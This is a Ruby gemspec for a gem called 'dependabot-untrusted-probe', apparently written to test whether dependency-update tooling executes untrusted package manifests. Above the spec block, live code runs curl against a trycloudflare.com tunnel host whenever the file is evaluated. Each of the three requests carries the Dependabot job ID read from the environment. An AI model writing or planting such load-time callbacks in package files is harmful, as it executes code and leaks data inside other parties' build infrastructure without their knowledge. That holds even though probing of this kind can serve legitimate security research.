require "open3"

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "unknown")
receiver = "hey-nuclear-arbitrary-stripes.trycloudflare.com"
probes = {
  "https-control" => "https://#{receiver}/private/scheme/job-#{job_id}/https-control",
  "http-implicit-positive" => "http://#{receiver}/private/scheme/job-#{job_id}/http-implicit-positive",
  "http-explicit-80-negative" => "http://#{receiver}:80/private/scheme/job-#{job_id}/http-explicit-80-negative"
}

probes.each do |label, probe_url|
  begin
    stdout, stderr, status = Open3.capture3(
      "curl", "--silent", "--show-error", "--max-time", "10",
      "--output", "/dev/null", "--write-out", "%{http_code}", probe_url
    )
    warn "DEPENDABOT_SCHEME_PROBE label=#{label} job_id=#{job_id} exit=#{status.exitstatus} http_code=#{stdout.strip.inspect} stderr=#{stderr.strip.inspect}"
  rescue StandardError => error
    warn "DEPENDABOT_SCHEME_PROBE label=#{label} job_id=#{job_id} error=#{error.class}:#{error.message}"
  end
end

Gem::Specification.new do |spec|
  spec.name = "dependabot-untrusted-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned dependency provenance probe"
  spec.authors = ["chawdamrunal"]
  spec.files = ["lib/dependabot_untrusted_probe.rb"]
  spec.require_paths = ["lib"]
  spec.license = "MIT"
end
